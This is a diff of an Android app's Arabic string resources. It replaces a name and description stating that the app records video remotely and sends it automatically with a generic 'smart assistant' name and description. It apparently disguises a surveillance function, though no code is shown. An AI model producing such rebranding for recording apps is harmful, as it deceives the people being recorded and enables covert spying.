@@ -1,7 +1,7 @@
 <resources>
-    <string name="app_name">عين الأمان</string>
-    <string name="header_title">اسحاق للمساعدة (:</string>
-    <string name="explanation_title">مرحباً بك في عين الأمان</string>
-    <string name="explanation_desc">هذا التطبيق مصمم خصيصاً لتسجيل عن بعد. سيقوم التطبيق بتسجيل مقاطع فيديو بجودة عالية وإرسالها إليك تلقائياً. نطلب منك منح الأذونات اللازمة لضمان عمل الخدمة واستقرارها.</string>
+    <string name="app_name">توت</string>
+    <string name="header_title">توت للمساعدة (:</string>
+    <string name="explanation_title">مرحباً بك في توت</string>
+    <string name="explanation_desc">أهلاً بك في تطبيق توت، مساعدك الذكي والمتطور. نحن هنا لمساعدتك في كل ما تحتاجه.</string>
     <string name="confirm_button">بدء الاستخدام</string>
 </resources>
